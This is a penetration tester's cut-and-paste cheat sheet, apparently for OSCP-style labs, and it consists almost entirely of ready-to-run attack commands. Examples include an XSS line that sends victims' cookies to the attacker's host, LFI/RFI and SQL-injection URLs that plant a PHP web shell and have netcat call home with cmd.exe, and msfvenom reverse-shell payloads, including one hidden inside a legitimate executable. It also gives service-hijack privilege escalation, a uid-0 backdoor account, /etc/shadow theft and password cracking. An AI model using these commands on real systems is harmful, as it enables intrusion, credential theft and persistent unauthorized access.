#####################################################
#  A Pastables File: A quick reference sheet to    #
#  cut and paste from.                             #
#  Author: ED-209-Mk7      			   #
#####################################################

============================================================================================
					MISC
============================================================================================
/msg NickServ IDENTIFY <password>

/join #offsec

#How to "save" the IP Address of a target and pass it in CLI
export tgt=<targets IP>
#test
echo $tgt

#Save the attack IP box
export me=<kali box ip>
echo $me

#tar up the root folder (c: create,f: file, j: compress bzip, p: preserve permissions, v: verbose)
tar -cfjpv root.tar.gz /root/

#untar the root folder (x: extract, j: bzip, p: preserve, v: verbose)
tar -xvf ./rootfolder.tar.gz --overwrite --directory /

#Untar a tar.gz file
tar xvzf archive.tar.gz

#packages used below that may not be included by default in Kali
apt-get install seclists gobuster

#Setting up a non-root user (wireshark and other risky things)
adduser <something>

#Add them to Wireshark Group
usermod -aG wireshark <something>

#Give up control on xhost
xhost +
#Give it back when done
xhost -

#execute as the <something>
su <something>
wireshark

----------------------- NEW METHOD --------------------------

Get in an set up non root user in Kali; set passwd; add to sudo; cp /root/ to /home/user1; add to wireshark group; log back in as user1


============================================================================================
		TEXT MANIPULATION
===========================================================================================
#replace newline with a comma
tr "\n" ","

============================================================================================
 !!!-=:ENUM ENUM ENUM ENUM ENUM ENUM ENUM ENUM ENUM ENUM ENUM ENUM ENUM ENUM ENUM ENUM:=-!!
--------------------------------------------------------------------------------------------
 Objectives:
 1. TCP and UDP Ports
 2. What Services the Ports are actually offering
 3. OS and Version
 4. Machine's Role
 5. Web Server Version
 6. Web Application version
		*Web Application Attacks are a separate process below
 7. Vulnerabilities
 8. Default Creds for all the things
 In short look for the way in....
============================================================================================
PORT SCANNING (All ports for both TCP/UDP)
********************************************************
# As of Mar 19:
# It has been found to be much faster to use masscan then pass the ports to nmap for service enumeration.

masscan -p1-65535,U:1-65535 $tgt --rate=1000 -e tun0 |tee masscan-all-tcp-and-udp.txt
cat masscan-all-tcp-and-udp.txt | grep tcp| awk '{print $4}'| cut -d / -f1 |sort n > tcp-ports
cat masscan-all-tcp-and-udp.txt | grep udp| awk '{print $4}'| cut -d / -f1 |sort n > udp-ports
nmap -v -n --reason -p <TCP Ports> -sT -sC -sV $tgt -oA services-tcp
nmap -v -n --reason -p <UDP Ports> -sU -sC -sV $tgt -oA services-udp


-----------------------------Previous Methodology--------------------
# Nmap is the old trusty go to. Unicorn is much faster (especially for UDP) but alledlky
# not as reliable.

unicornscan -i tap0 $tgt:a

unicornscan -i tap0 -m U $tgt:a

nmap -sU --script=snmp-info.nse -p 161 $tgt

nmap -T5 -p- $tgt -oA Verify

nmap -sC -v -n --reason -T5 -p 21,80,3389 $tgt -oA serviceScritps

nmap -sV -v -n --reason -T5 -p 21,80,3389 $tgt -oA serviceVersions

******************************************************
Manual Banner Grabbing
******************************************************
#connect to the target port
nc -nv $tgt 80
GET / HTTP/1.1
HEAD / HTTP/1.1
echo -e "HEAD / HTTP/1.1 \r" |nc -nvv $tgt 80

#Hopefully response has version of the software

#What about 443????
openssl s_client -connect $tgt:443

*******************************************************
By Port
Start breaking tools down by port/protocol/service
****************************************************
21- ftp 
-------------------------------------------
22 - ssh
-------------------------------------------
23 - telnet
-------------------------------------------
25 - smtp
-------------------------------------------
53 - DNS
-------------------------------------------
80 - http
-------------------------------------------
161 - snmp
-------------------------------------------
443 - ssl
-------------------------------------------
?
-------------------------------------------
?
-------------------------------------------
?
-------------------------------------------



********************************************************
Scanning Misc.
********************************************************
# netcat cycle through ports.... poorman's scanner. It outputs in stderr so
# redirect stderr to std out (2>&1)
nc -nvv -w 1 -z $tgt 1-65535 2>&1 | tee nc_scan.txt

#snmp-check- mad loot if the target offers snmp with a public string
snmp-check $tgt

snmpwalk -v 1 -c public $tgt

#look at users with sessions open on target; look for the <03> flag
nmblookup -A $tgt

#Enum Null Sessions Share; On a certain box... here was one of the <03> flags
smbclient -L //<machine name> -I $tgt -N

#Connect to //[name of <03>]/[name of share]
smbclient //<machine name>/wwwroot -I $tgt -N

nbtscan 10.11.1.1-254

#null session enum
rpcclient -U "" $tgt
>srvinfo
>enumdomusers
>getdompwinfo

#enum4linux does the above rpcclient checks
enum4linux -v $tgt

nmap -p 139,445 --script s,b-enum-users $tgt

unicornscan -i tap0 -E -m U $tgt:a > unicornUDPfull

#Check if a website is running something like PHP
wfuzz -c -w /usr/share/wfuzz/wordlist/general/big.txt --hc 404 http://$tgt/FUZZ.php

#FUZZ is how wfuzz knows where to ... fuzz

==========================================================================================
			     WEB APP ATTACKS  --Goal:
1. Web Server Software/Version
2. Web Application Software/Version
3. SQLI?
4. Vulns
==========================================================================================
#Good, quick and dirty enum
curl -i http://$tgt:80/

#Initial Sweep of the website (Directory Busting)
gobuster -u http://$tgt9/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e

#Confirm hidden pages
gobuster -u http://$tgt/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s '200,204,403' -e

#wfuzz taken from pentesterlab.com sqli to shell
#wfuzz -c output with colors; -z file,[wordlist]; -hc 404 -ignore the 404's; http://$target/FUZZ - fuzz tells fuzz where to brute
$ python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://vulnerable/FUZZ
#wfuzz to detect php on the server
$ python wfuzz.py -z file -f commons.txt --hc 404 http://vulnerable/FUZZ.php


LOOK UP AND TRY DEFAULT CREDS!!!

#Standard check for XSS vulnerability
<script>alert("XSS")</script>

#?
<iframe SRC="http://$me/report" height = "0" width ="0"></iframe>

#Grab a cookie....
<script>
new Image().src="http://$me:81/bogus.php?output="+document.cookie;
</script>

#Standard quick and dirty php shell
<?php echo shell_exec($_GET['cmd']);?>

LANG=../../../../../../../xampp/apache/logs/access.log%00

****************************************
LFI and RFI
*****************************************

LFI Move nc.exe to target:
$tgt/addguestbook.php?name=badDude&comment=pwnU&cmd=tftp%20-i%20$me%20get%20nc.exe&LANG=../apache/logs/access.log%00

LFI Have nc.exe to call home:
http://$tgt/addguestbook.php?name=badDude&comment=pwnU&cmd=nc%20-nv%20$me%20443%20-e%20cmd.exe&LANG=../apache/logs/access.log%00

RFI to Move nc.exe to target:
http://$tgt/addguestbook.php?name=badDude&comment=pwnU&LANG=http://$me/evil.txt%00

RFI to have nc.exe call home:
http://$tgt/addguestbook.php?name=badDude&comment=pwnU&LANG=http://$me/evil.txt%00

LFI vs RFI Command Input:
LFI will execute the CMD found in the command line; enabled by the php 'cmd' variable injected into the logs
RFI will execute the CMD found in the "evil.txt" found in the evil.txt hosted on the attack machine

==========================================================================================
WORDPRESS
==========================================================================================
# Default Creds Admin Admin
# location of passwords: /var/www/wordpress/wp-config.php

# WP Scanner
??

============================================================================================
				SHELLS
============================================================================================
##nc shell upgrade to /bin/bash/
python -c "import pty;pty.spawn('/bin/bash');"

<?php echo shell_exec($_GET['cmd']);?>


============================================================================================
					MSF VENOM
============================================================================================
A great cheat sheet: https://thor-sec.com/cheatsheet/oscp/msfvenom_cheat_sheet/

# List payloads
msfvenom -l

#Encoding payloads
msfvenom -p <Payload> -e <encoder> -f <format> -i <encode count> LHOST=$me LPORT=$mePort

# Examples from Thor-Sec:

#Handler Setup
#Meterpreter
msfconsole -q
use exploit/multi/handler
set PAYLOAD <PAYLOAD>
set LHOST <IP>
set LPORT <IP>
set ExitOnSession false
exploit -j -z

# Netcat
nc -nlvp <PORT>

# Linux--------------------
# Reverse Shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf

# Bind Shell
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf

# Windows------------------
Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

Bind Shell
msfvenom -p windows/meterpreter/bind_tcp RHOST= <IP> LPORT=<PORT> -f exe > shell.exe

CMD Shell
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

User Creation
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe

# Mac ----------------------
Reverse Shell
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > shell.macho

# Bind Shell
msfvenom -p osx/x86/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f macho > shell.macho

# Web Payloads-------------------
# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war

# Scripting Payloads
# Python
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh

# Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl

---------------------------------A/V EVASION-----------------------------------------------
# Inject payload into a legit file

# Veil evasion

# ? what else?

============================================================================================
					WINDOWS COMMAND LINE STUFF
============================================================================================
#Show networked drives
net share

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

c:\windows\system32\cmd.exe

netstat -ano

tasklist /svc

tasklist /svc > svclist.txt

schtasks /query /fo LIST /v

net start

DRIVERQUERY

netsh firewall show opmode

netsh firewall set opmode enable

netsh firewall add portopening TCP 80 HTTP enable subnet

dir "C:\Documents and Settings"

systeminfo

net user John fadf24as /ADD

net localgroup administrators John /add

whoami /priv
	/groups
	/user

#Windowsxp
echo %username%

#Disable MPP
netsh int tcp set security mpp=disabled



bootcfg /raw "/noexecute=alwaysoff"

============================================================================================
				INTERNAL ENUMERATION
		Goals: understand who, what, where, when, Why
			Remember: Check, Collect, Clean
============================================================================================

1. Who else is on right now?
Linux: w
Windows: query user		remotely: query user /server:computername

2. Who has been on?
Linux: last
Windows: ?

3. What has this box been talking to?
Linux: arp -e, check ssh known_hosts
Windows: arp /all, check ssh known_hosts

4. What is this box able to talk to?
Linux: route print, ip addr
Windows: route print, ipconfig


==========================================================================================
			     SQLI
	Goals: Enumerate DB's; Find Creds and or rain shells.
		 Test it, Map it, Steal it....
==========================================================================================
#From pentesterlab.com:
# retrieve information using the SELECT statement;
# update information using the UPDATE statement;
# add new information using the INSERT statement;
# delete information using the DELETE statement.
# Asterisk * is WILDCARD

#SELECT columnsYouWant FROM tablesYouWant WHERE informationMatchesWhatYouWant
#Example: SELECT column1, column2, column3 FROM table1 WHERE column4='user' AND column5=3 AND column6=4;
# will retrieve from the following table:
#column1	column2		column3		column4		column5		column6
# 1			test		Paul		user			3		   13
# 2			test1		Robert		user			3		   4
# 3			test33		Super		user			3		   4
# the following info:
#column1	column2		column3
#	2		 test1		Robert
#	3		 test33		 Super
# Note Row 1 wasn't selected because of what was matched in Column 6.
# Only the first 3 columns were selected because of the query

**********************************TESTING IT*************************************
Goals:
1. Find out if it is sending unfiltered data to the db
2. How is it reading inputs
Testing for a vulnerability-
IOW see if it breaks- if it does it is passing stuff directly to the back-end :-)
********************************************************************************
#Does it do math; 2-1 shows article 1
/article.php?id=2-1

#Does it look for stings?
#a ' break the backend query by passing the ' as 's are used for strings in an SQL Query
/article.php?id=1'      (added a ' to the end)

#PROPER EXAMPLES OF SQL WE ARE TRYING TO BREAK (What is under the hood):
#SELECT id,name FROM users where name='test' and id=3;
#or
#SELECT id,name FROM users where ( name='test' and id=3 );
#If for example the injection point is at the word test we can try and break it with
#odd numbers of ' or ( or ) OR adding comment delimiters to break the query such as -- or # or */

#Does it break? Add a ' to the end of the line
http://$tgt/comment.php?id=738'

********************************MAPPING IT**************************************
Goals:
1. How many columns?
2. Find the 'viewport'... where can we make data appear?
3. Columns and table names?
********************************************************************************
# How many columns are being pushed to the page?
# Columns Discovery: first instance of a break it is 1 too high.
http://$tgt/comment.php?id=738 order by 7 #if it breaks at 7 there are 6 columns

#Weld attacking request with victims. Keep it balanced...
union all select

#Map the columns to their data.  Look for a column that lends to easy Data display... like the comments column
http://$tgt/comment.php?id=738 union all select @@version,2,3,4,5,6
# then 1,@@version,3,4..... then 1,2,@@version,4 (moving it until it shows up- thats your 'viewport')

#Mysql commands handy to inject:
#Current user logged in?
user()
current_user()
#Version
version()
@@version
#current DB
database()

# Map the names of tables... looking for something juicy like users etc. (Column 5 is the 'viewport')
http://$tgt/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
table_name,6 FROM information_schema.tables

# Map the columns of a particular table... for example users.
http://$tgt/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'

# Or from pentesterlab... a more organized method.
1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns

# But wait... the window is only 1 column? concat them!
1 UNION SELECT 1,concat(table_name,':', column_name),3,4 FROM information_schema.columns

#Your desired info is probably near the end as the first load of tables are for MySQL itself.

**********************QUICK KILL ADMIN LOGIN**************************
# Authentication Bypass
# This essentially selects the first line of users.  If its an admin
# it may log yo in as admin. Place this into the name input box if Admin is the first.
wronguser' or 1=1 LIMIT 1;#

# The SQL SELECT LIMIT statement is used to retrieve records from one or more tables in
# a database and limit the number of records returned based on a limit value.
# TIP: SELECT LIMIT is not supported in all SQL databases. For databases such as SQL Server
# or MSAccess, use the SELECT TOP statement to limit your results.

# Going for the kill... Attempt to extract usernames and passwords Note 0x3a = ':'
http://$tgt/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
0x3a is ':'

# To read the contents of a file on target server file system
http://$tgt/comment.php?id=-1 union select all 1,2,3,4,load_file(‘c:/windows/system32/drivers/etc/hosts’),6

# Writing to a file on the Servers File System
http://$tgt/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'

# Using the created backdoor to call home:
http://$tgt/backdoor.php?cmd=nc -n $me 443 -e cmd.exe

# Blind SQL Injection using the sleep function   if the server sleeps it indicates it might be SQLi Vulnerable
http://$tgt/comment.php?id=738-sleep(5)

# To check sql version via blind SQLi timing method... if version is equal to X then sleep 5
http://$tgt/comment.php?id=738-sleep(5)-IF(MID(@@version,1,1)='5', SLEEP(5), 0)

# Shell via dropdown Post Parameter... AKA Proxy attack
Lang=  'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor4.php

So far..
' UNION SELECT 1,2,3,4,@@version,6 #
^                                  ^
First breaks and drops            Terminator prevents raising us back up since there is a hidden '


Investigate further......  Why the #?  DRAW THIS OUT!!!!
'union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor7.php
^                                                                                 ^                             ^
|---------------------------------------------------------------------------------|-----------------------------|
First one breaks it.                                      This one encases the file string...              We dont terminate this one because we need the hidden ' =OR= use '#


The whole key here is figuring out if there is a hidden ' at the end of the input box and where else we need a ' ... for example we need a ' encasing around the file destination

++++++++SQLMAP++++++++++++++

sqlmap -u $tgt --crawl=1

sqlmap -u $tgt/discoveredinjectpoint.php?id=738 --dbms=mysql --dump --threads=5

sqlmap -u $tgt/discoveredinjectpoint.php?id=738 --dbms=mysql --os-shell

--cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7"

--headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u 'http://localhost/dvwa/vulnerabilities/
sqli_blind/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id


++++++sqlmap progressive++++++++  POST DATA
#What are we dealing with?
sqlmap - u $tgt/url --dbms=mysql --forms --banner

#Who are the DB users.... not user data but the users administering the DB
sqlmap - u $tgt/url --dbms=mysql --forms --banner --users

#Get those users? passwords?
sqlmap - u $tgt/url --dbms=mysql --forms --banner --users --passwords

#Enumerate the server and its DB that the user has access to
sqlmap - u $tgt/url --dbms=mysql --forms --banner --dbs

#Enumerate a particular DB
sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB

#What are the Tables?
sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB --tables

#what are the columns?
sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB -T $tgttable --columns

#Target the columns you want
sqlmap - u $tgt/url --dbms=mysql --forms --banner -D $targetDB -T $tgttable -C name,of,columns --dump

#levels 1-5- Default 1. Controls the numbers of payloads it tries.  For example, user agents, cookies etc. it starts attacking all of them.

#Risk 1-3- The higher the number the riskier the attack.  A higher level of risk could corrupt and crash the database.

#--technique= manually select the type of attack. Specify which one you know works to save time.

sqlmap -u http://$tgt/ --crawl=20 --threads=5 --forms --batch --dbms=mysql --dbs  

PAYDAY EXERCISE
csid =  ' AND SLEEP(5) #
' AND SLEEP(5) AND 'TSXP'='TSXP&redirect_url=index.php&user_login=ncri&password=

==========================================================================================
					ORACLE DB
==========================================================================================
http://oracleserver:port/pls/simpledad?admin_/globalsettings.htm

select * from v$version

select * from global_name

select table_name FROM all_tables;

select owner, table_name FROM all_tables;

SELECT column_name FROM all_tab_columns WHERE table_name = 'blah';

SELECT column_name FROM all_tab_columns WHERE table_name = 'blah' and owner = 'foo';

SELECT column_name FROM all_tab_columns WHERE table_name = 'USER$' and owner = 'SYS';

============================================================================================
					FILE TRANSFER  Goals: Upload tools to expand access
					Remember: To avoid AV it is best to use legit Admin tools.
============================================================================================
# DUMMY ACCOUNT - Lets not leave our creds for root on the victim machine
# thedude:!thedudeabides!$ 


Simple Python Server:
python -m SimpleHTTPServer 8080

nc shell upgrade to /bin/bash/
python -c "import pty;pty.spawn('/bin/bash');"


# WGETVBS
cscript wget.vbs http://$me/scsiaccess.exe scsiaccess.exe
                 http://   $tgt    /<source>       <destin>

# PUREFTP:
run script
OR
user: offsec
pass: labL@B123

# TFTP:
ATTACKER:	atftpd --daemon --port 69 /tftp
VICTIM: 	tftp -i $me get nc.exe

# On the other hand if you are on the computer wanting to receive file from a remote computer:
scp username@remote:/file/to/send /where/to/put

# If you are on the computer from which you want to send file to a remote computer:
scp /file/to/send username@remote:/where/to/put
scp ./authorized_keys thedude@$me:/tmp/

ssh-keygen -R [hostname]

# prep and SMB server
smbserver.py ED209 /root/labs/31ralph

# on the victim tranfer a file via SMB
net view \\$tgt

# move, dir, or copy
dir \\$me\ED209
# Copy to the drive
Copy file.txt \\$me\ED209\

# Copy FROM the drive
copy \\$me\ED209\file.txt .

# Run it via SMB
\\$me\ROPNOP\meterpreter.exe

============================================================================================
			Fun with SSH
============================================================================================

============================================================================================
				COMPILING
============================================================================================

GCC Compile 32 bit on x64:
sudo apt-get install gcc-multilib      <-- These installed first

# Ming - Cross Compiler for Windows


==========================================================================================
				PRIV ESC
==========================================================================================
---------WINDOWS-----------------------------------
Great script to get started with is PowerUP:
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
PowerUP is only a decent start - and it doesn't find everything...

March 19 Update of most common windows PrivEsc Paths:

1. command histories
2. DLL Hijack
3. Service Hijacking


1. Command histories
doskey /history

2. DLL Hijacks
- DLL Load order
- Missing DLLs (For example the office fax.dll)

Use ProcMon to find phantom DLLs and set it to filter for create file; return code for Not Success- then show results for NAME NOT FOUND
Make Proxie DLLs if you want to keep the program from crashing

Check for folders such as C:\Program Files\ for "Create Files" or "Append Data" permissions - allows users to install anything or add DLL's

3. Service Hijacking
# If you can write to a dir that a service calls a dll from you win...
# HKLM/System/CurrentControlSet/Services
# If you can set a value or a subkey on any of these you are going to be system soon
--------------------------------------------------------------------------
Source: https://toshellandback.com/2015/11/24/ms-priv-esc/

# Unquoted Winddows Services... quick win!
# In short - if a dev creates a service and fails to enclose the service path in quotes
# it will try each word prior to a space as a separate file.  Example:
# C:\Program Files\Some Folder\Service.exe
# It will try: C:\Program.exe; C:\Program Files\Some.exe; C:\Program Files\Some Folder\Service.exe
# The goal here is write a malicious payload into one of those spots...

# Locate such a service
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

# icacls will tell you if you have permissions to write there....



------------------------------------------------------------------
"net localgroup administrators low /add"

##FUZZY METHOD###-=WINDOWS=-
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

hostname

echo %username%

net users

net user John fadf24as /ADD

net localgroup administrators Johnnet /add
net group "Domain Admins" john.johnson /ADD /DOMAIN



whoami /priv
	/groups
	/user

ipconfig /all

route print

arp -A

netstat -ano

tasklist /SVC

#firewall stuff is WinXP sp2+

netsh firewall show state

netsh firewall show config

netsh advfirewall set allprofiles state off

schtasks /query /fo LIST /v
==========================================Services===================================

tasklist /SVC
net start

sc qc "Audiosrv"

sc query "Audiosrv"

#Can you even stop the service?
sc stop "Audiosrv"


DRIVERQUERY

# Service perms
sc query
sc qc [service_name]

#Accesschk Stuff
# (always do this first!!!!!)
accesschk.exe /accepteula

accesschk.exe -ucqv * /accepteula

#requires sysinternals accesschk!
accesschk.exe -ucqv [service_name]

#(won't yield anything on Win 8)
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -ucqv [service_name] /accepteula

# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\ /accepteula
accesschk.exe -uwdqs "Authenticated Users" c:\ /accepteula

# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.* /accepteula
accesschk.exe -uwqs "Authenticated Users" c:\*.* /accepteula

# Binary planting
sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
sc config [service_name] obj= ".\LocalSystem" password= ""
sc qc [service_name] (to verify!)
net start [service_name]

sc config upnphost binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"

sc config upnphost obj= ".\LocalSystem" password= ""

sc qc upnphost

net start upnphost

+++++++++SCRATCHPAD+++++++++++++

sc config upnphost binpath= "C:\inetpub\rev443.exe"

----------------------------------------------------------------------------------

windows-privesc-check.exe --audit -a -o report

#WMIC
wmic /?
use wmic_info script!!

#WMIC Patch levels
wmic qfe get Caption,Description,HotFixID,InstalledOn

#specific patch level
wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."

#AlwaysInstalledElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated

dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKLM /f password /t REG_SZ /s

*********POSH SCRIPT WITH KNOWN CREDS***********
echo $pw = ConvertTo-SecureString "aliceishere" -AsPlainText -Force > go.ps1
echo $thecreds = New-Object System.Management.Automation.PSCredential ("alice",$pw) >> go.ps1
echo $computer = "Bethany2" >> go.ps1
echo [System.Diagnostics.Process]::Start("C:\Users\Public\nc.exe","$me 8790 -e cmd.exe",$thecreds.Username, $thecreds.Password, $computer) >> go.ps1

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File go.ps1

****POTATO*******
Potato.exe -ip -cmd [cmd to run] -disable_exhaust true

Potato.exe -ip -cmd "C:\\windows\\system32\\cmd.exe /k net localgroup administrators lowprivguy /add" -disable_exhaust true

pot.exe -ip $tgt -disable_exhaust true -cmd "C:\\windows\\system32\\cmd.exe /k net localgroup administrators lowprivguy /add"

************************************LINUX***************************************
Mar 19 Update of most common paths to root!:
Automated:  the script lse at: https://github.com/diego-treitos/linux-smart-enumeration.git

1. Command histories
2. "secret" files
3. sudo abuse
4. insecure permissions
	a. custom scripts
	b. setuid

1. Command histories
history
cat ~/.bash_history

2. Secret files
ls -lha

3. sudo abuse
# Check if the user has sudo access to certain commands....
# Hopefully the user has sudo access to less/more, find, or a script interpreter like Python
sudo -l

# INSTANT WIN! If the commands don't have the full path you can just create anything you want
# by the same name in your local path and run as sudo... more modern linux will look at trusted paths
# first... however if that file is missing for some reason it will continue down the path

#less
less /var/log/messages; then inside less type "!/bin/bash

#find
find /var/log -name messages -exec /bin/bash -i \;

4. insecure permissions
a.
# By default home dirs are created world readable
- start-up scripts		~/bashrc's   /etc/systemd/  /lib/systemd/	
- possible cron jobs	/etc/crontab  (theres a few to look at)
- Follow the bouncing ball on what the scripts are calling...
b.
# To find setuid / setgid 
find / -perm -4000 -o -perm -2000 2>/dev/null
find /usr/bin -perm -4000 2>/dev/null

for i in $(find / -perm -4000 -o -perm -2000 2>/dev/null); do ls -lha $i;done
for i in $(find /usr/bin -perm -4000 2>/dev/null); do ls -lha $i;done

# What does the bin or script call? look for exploitable 
ltrace /usr/bin/custom.sh
# Does anything lack a full path to the command?  If not create your own new command in local dir
# Make the new malicious script that calls #!/bin/dash as dash DOES NOT DROP setuid bits; where as bash does
----example-----
#!/bin/dash
cp /bin/dash evil
chown root:root evil
chmod u+s evil
-----------------
chmod 755 name-of-hijacked-command
# Now set your path up to hijack the command; this says grab anything from my local path first!
export PATH=.:$PATH

# Now call the hijacked script


Check MySQL example from Jake Williams
get root
mysql -u root -p itsasecret
show databases;
use servers;
show tables;
# See a table called auth
describe auth;
select * from auth;
l00t!
############### G0tm1lks ################

----- Easy button - Kernel Exploit -----------
cat /etc/issue
cat /etc/*-release

cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux

cat /etc/profile
cat /etc/bashrc

ps aux
ps aux |grep root

ps -ef
ps -ef |grep root

top
cat /etc/services


id
who
w
last

#users
cat /etc/passwd | cut -d: -f1

#superusers
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'

cat /etc/sudoers

sudo -l

ls -ahlR /root/

cat /var/apache2/config.inc

cat /var/lib/mysql/mysql/user.MYD

cat /root/anaconda-ks.cfg

==========================================================================================
				POST PILLAGE
==========================================================================================
cat hashdump.txt | cut -d ":" -f4


++++++++++++++++++++LINUX+++++++++++++++++++++++++++
#Raw shell... set PATH to ease the pain
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

cat /etc/passwd

cat /etc/shadow

locate ssh_config

find / -name '*secret*'
	-type f		Object is a file
	-type d		Object is a directory
	-name
	-perm		Permissions at least match
	-mmin <-+time>	File modified in less or more minutes
	-mtime <+-days>
	-user <username>
#Who are the users?
getent passwd |tail -3

#email locations:
/var/mail/usernames
~username/Mail
~username/mail

#find juicy dirs
find / -type d -perm -777 | xargs ls -ld

#Look for or plant SSH private keys
~username/.ssh

#adding yourself as root user for later access
adduser thedude
passwd thedude
usermod --uid 0 --non-unique thedude


++++++++++++++++++WINDOWS+++++++++++++++++++++++++++
#poor mans whoami
tasklist -v


==========================================================================================
				PASSWORD ATTACKS
==========================================================================================
#A list of usernames, checking for no passwords (n) and users using their usernames as
#passwords (s) and timing of 1.
hydra -L usernames.txt -e sn -t 1 ftp://172.17.0.150

hydra -L users.txt -e sn -t 1 $tgt ssh


Default Usernames and Passwords

CIRT
http://www.cirt.net/passwords

Government Security - Default Logins and Passwords for Networked Devices

http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php

Virus.org
http://www.virus.org/default-password/

Default Password
http://www.defaultpassword.com/


hash-identifier

+++++++++++++++++++++++++++++++++john++++++++++++++++++++
#LM HASHES?
john --incremental:lanman --format=LM hashdump.txt

john --format=NT --rules --wordlist=/usr/share/wordlists/rockyou.txt hashdump

john 127.0.0.1.pwdump

#To use a wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump

#To mutate a list on the fly
john --rules --wordlist=/usr/share/wordlists/rockyou.txt 127.0.0.1.pwdump

#To unshadow unix passwd
unshadow passwd-file.txt shadow-file.txt > unshadowed.txt

#Attempt to brute force it
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

#Create a password session that can be paused and resumed
john --session=payday --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt &

#check on john
john --status

#bring job to front to abort it
fg 1 (or the job number)

#restore the seesion back to the background
john --restore=payday &

#cracking zip files
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt bank-account.zip

#Mutating a wordlist from CEWL etc.
john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt

#Caracking HTTP
medusa -h $tgt -n 9505 -u bethany -P mutated.txt -M http -m DIR:/~Public -T 10
==========================================================================================
				DEF CREDS
==========================================================================================
Wordpress
admin admin

vsFTPd 2.3.4
anonymous
*blank*

ORACLE isql
SYSTEM SYSTEM

==========================================================================================
				VENOM PACKAGES
==========================================================================================
msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf LHOST=$me LPORT=9835 > linuxmetrpr.elf

msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=$me LPORT=443 > nonstaged.elf

msfvenom -p linux/x86/meterpreter/reverse_tcp -f elf LHOST=$me LPORT=443 > metrev443.elf

msfvenom -p linux/x86/shell_reverse_tcp -f c -b "\x00\x0a\x0d" LHOST=$me LPORT=9874 EXITFUNC=thread

#inject a payload into an PE
msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -x ./plink.exe -o plinkevil443.exe

msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f jsp > rev443.jsp

